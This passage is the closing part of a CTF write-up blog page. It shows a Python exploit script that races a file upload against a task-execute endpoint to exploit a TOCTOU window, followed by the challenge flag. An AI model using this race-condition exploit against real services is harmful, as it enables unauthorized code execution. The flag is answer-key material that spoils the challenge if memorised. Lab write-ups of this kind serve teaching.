</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] found target temp file: </span><span class=si>{</span><span class=n>target_tmp_file</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>target_tmp_file</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>spam_execute</span><span class=p>(</span><span class=n>session</span><span class=p>:</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>,</span> <span class=n>target_tmp_file</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># spam the execute endpoint until the file upload is complete to try get into the TOCTOU window</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=n>upload_completed_event</span><span class=o>.</span><span class=n>is_set</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>EXECUTE_ENDPOINT</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span> <span class=n>target_tmp_file</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] executing task </span><span class=si>{</span><span class=n>target_tmp_file</span><span class=si>}</span><span class=s2>, status code: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] error executing </span><span class=si>{</span><span class=n>target_tmp_file</span><span class=si>}</span><span class=s2>, status code: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>(</span><span class=n>s</span><span class=p>:</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=p>,</span> <span class=n>k</span><span class=o>=</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=p>,</span> <span class=n>k</span><span class=o>=</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;logging in as: </span><span class=si>{</span><span class=n>username</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>password</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>LOGIN_ENDPOINT</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span> <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=n>password</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>raise_for_status</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1>#s.proxies = {&#34;http&#34;: &#34;http://127.0.0.1:8080&#34;, &#34;https&#34;: &#34;http://127.0.0.1:8080&#34;}</span>
</span></span><span class=line><span class=cl>    <span class=n>login</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>upload_timestamp_ms</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>*</span> <span class=mi>1_000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] starting upload at timestamp </span><span class=si>{</span><span class=n>upload_timestamp_ms</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>upload_and_keep_conn_open</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=s2>&#34;safe.yaml&#34;</span><span class=p>,</span> <span class=mi>57</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>exploit</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>upload_timestamp_ms</span><span class=p>)</span> <span class=c1># do something while the connection is open</span>
</span></span><span class=line><span class=cl>    <span class=n>resume_upload</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>  <span class=c1># wait for the upload thread to finish</span>
</span></span><span class=line><span class=cl>    <span class=n>upload_completed_event</span><span class=o>.</span><span class=n>set</span><span class=p>()</span>  <span class=c1># signal that the upload is complete</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] exploit completed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span></span></span></code></pre></div></div><blockquote><p>Flag: <code>TeamItaly{n0_w4y_7h4t's_A_s4fe_Ta5k_06a77416}</code></p></blockquote></div></div></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span class="flex flex-col"><a class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/posts/htb-businessctf-2025/blockout/><span class=leading-6><span class="inline-block rtl:rotate-180">&larr;</span>&ensp;HTB Business CTF 2025 - Blockout [Author Writeup]
</span></a><span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-05-22T00:00:03+01:00>22 May 2025</time>
</span></span><span class="flex flex-col items-end"><a class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/posts/teamitaly-quals-2025/vibechallenge/><span class=leading-6>TeamItaly 2025 Quals - VibeChallenge&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
</span></a><span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-06-10T00:00:01+01:00>10 June 2025</time></span></span></div></div></footer></article><div id=scroll-to-top class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/tags/ title=Tags>Tags</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2026
simonedimaria</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://simonedimaria.xyz/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>